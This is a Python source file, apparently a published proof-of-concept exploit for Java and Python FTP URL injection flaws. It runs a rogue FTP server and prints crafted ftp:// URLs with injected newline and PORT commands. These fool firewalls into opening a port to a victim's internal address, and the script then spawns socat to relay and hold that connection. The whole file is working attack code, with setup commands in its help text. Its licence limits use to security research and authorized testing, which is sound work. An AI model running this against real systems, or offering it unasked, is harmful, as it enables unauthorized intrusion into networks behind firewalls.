#!/usr/bin/env python3

# Copyright (C) 2016-2017 Blindspot Security LLC.
# Author: Timothy D. Morgan (@ecbftw)
#
# Licensed for your use only in the following situations:
# - Security research
# - Testing of software systems when authorized by the owner
#
# Derivative works are permitted, provided the above restrictions are
# retained.
#

import sys
import os
import time
import random
import argparse
import traceback
import socket
import threading
import subprocess
import urllib
import urllib.parse

overview="""
A proof-of-concept exploit for the Java and Python FTP injection flaws
described here:
  http://blog.blindspotsecurity.com/2017/02/advisory-javapython-ftp-injections.html

To use this exploit, you must be in a situation where you can force an
application (which uses a vulnerable version of Java or Python) to fetch
an FTP URL that you supply.  This script first prints a test FTP URL
that you supply to the application.  Upon receiving the request, this
script then calculates a second URL.  When you supply the second FTP
URL, it should successfully fool (some) firewalls into opening up the
desired port.

If successful, this script will spawn socat as a child process to create
a connection back to the victim system on the port you are trying to
open.  The socat process will listen locally and relay the TCP
connection.  The purpose of this is to snag the temporarily opened port
and hold it open, giving you time to connect to socat at your leisure.

Before running this service, first clamp down the MSS to make malicious
URL lengths predictable and shorter:
  iptables -A OUTPUT -p tcp --tcp-flags SYN,RST SYN --sport 21 -j TCPMSS --set-mss 536

This should be obvious, but this script listens on port 21, meaning it
needs root privileges.  This script requires you to supply the internal
IP address of the victim.  This is very easy to get, most of the time,
by forcing the victim to connect via an FTP URL to a non-FTP port.  See
the above article for some more details.
"""

parser = argparse.ArgumentParser(description=overview, formatter_class=argparse.RawTextHelpFormatter)

parser.add_argument('public_ip', default=None,
                    help='IP address the client can reach you at.')
parser.add_argument('internal_ip', default=None,
                    help='The victim host\'s internal IP address.')
parser.add_argument('target_port', type=int, default=None,
                    help='TCP port you want to fool the firewall into forwarding. Must be in the range [1024..65535].')
parser.add_argument('--port', type=int, default=21,
                    help='TCP port to listen on (default: 21).')
parser.add_argument('--ip', dest='ip', type=str, default='0.0.0.0',
                    help='Local IP address to listen on (default: 0.0.0.0).')


options = parser.parse_args()

QUIT = 0

NL = '\n'

def generateURL(pad_len):
    global options
    
    octets = options.internal_ip.split('.')
    octets.extend(["%d" % (options.target_port/256),
                   "%d" % (options.target_port%256)])
    port_cmd = "PORT%20"+(','.join(octets))
    padding = "X"*pad_len
    newline = urllib.parse.quote(NL)
    url_template = "ftp://x:y@%s/leet%s%s%s/z.txt"
    
    return url_template % (options.public_ip, padding, newline, port_cmd)


def ftpSession(clientSock, stream_id):
    clientSock.sendall(b'220 Port Opener Express\r\n')
    next_command = ''
    while not QUIT:
        command = ''
        if next_command:
            command = next_command
            next_command = ''
        else:
            while not command:
                try:
                    command = clientSock.recv(536, socket.MSG_DONTWAIT)
                except BlockingIOError as e:
                    pass
        sys.stderr.write(">> %s" % command.decode('utf-8'))
        
        if command[0:4].upper() == b'USER':
            clientSock.sendall(b'331 Papers please\r\n')
        elif command[0:4].upper() == b'PASS':
            clientSock.sendall(b'250 OK\r\n')
        elif command[0:3].upper() == b'CWD':
            if b'\nP' in command:
                sys.stderr.write("ERROR: not enough padding to isolate correct padding length\n")
                break
            elif command[-1:] == b'\n':
                sys.stderr.write("Correct padding!\n")
                clientSock.sendall(b'250 Directory changed\r\n')
            else:
                sys.stderr.write("Payload size appears to be: %d\n" % len(command))
                new_url = generateURL(len(command)-len(NL)-8) # 8 for "CWD leet"
                print("Try this URL instead:")
                print(new_url)
                break
        elif command[0:4].upper() == b'PORT':
            command,next_command = command.split(b'\r\n')
            octets = command[5:].decode('utf-8').split(',')
            ip = '.'.join(octets[0:4])
            port = int(octets[4])*256+int(octets[5])
            sys.stderr.write("Client has opened %s:%d\n" % (ip,port))
            clientSock.sendall(b'200 PORT command successful.\r\n')
            local_port = random.randint(31337,41337)
            relay_cmd = ['socat', 'tcp4-connect:%s:%d' % (ip,port), 'tcp4-listen:%d,bind=127.0.0.1' % local_port]
            print("Setting up relay on 127.0.0.1:%d; connect to this to access the targeted service" % local_port)
            child = subprocess.call(relay_cmd, stdin=subprocess.DEVNULL, stderr=subprocess.STDOUT)
            print("Relay finished.")
            break
        elif command[0:4].upper() == b'TYPE':
            clientSock.sendall(b'250 Switching to Binary mode.\r\n')
        elif command[0:4].upper() == b'EPSV':
            clientSock.sendall(b'500 Command not understood.\r\n')
        elif command[0:4].upper() == b'PASV':
            clientSock.sendall(b'500 Command not understood.\r\n')
        elif command[0:4].upper() == b'EPRT':
             clientSock.sendall(b'200 EPRT command successful.\r\n')
        else:
            print("Unknown command:", command)
            break
    print("Closing control channel.")
    clientSock.close()

print("First try to give the vulnerable host this URL:")
print(generateURL(2000))


threads = []
listenSock = socket.socket()
listenSock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listenSock.bind((options.ip, options.port))
listenSock.listen(100)

try:
    while 1:
        try:
            (clientSock, clientAddr) = listenSock.accept()
            sys.stderr.write("Connection received from %s:%s.\n" % clientAddr)
            clientSock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            clientSock.setsockopt(socket.IPPROTO_TCP, socket.TCP_WINDOW_CLAMP, 1)

        except Exception as e:
            print("Exception while listening: ", e)
            traceback.print_exc(e)
            continue
        except KeyboardInterrupt as e:
            QUIT=1
            break

        now = int(time.time())
        clientSrcPort = clientAddr[1]
        stream_id = "%d.%d" % (now, clientSrcPort)

        t = threading.Thread(target=ftpSession,
                             args=(clientSock, stream_id))
        threads.append(t)
        t.start()

except Exception as e:
    sys.stderr.write("Unexpected exception: %s\n" % repr(e))

listenSock.close()


QUIT=1
for t in threads:
    t.join()

sys.exit(0)
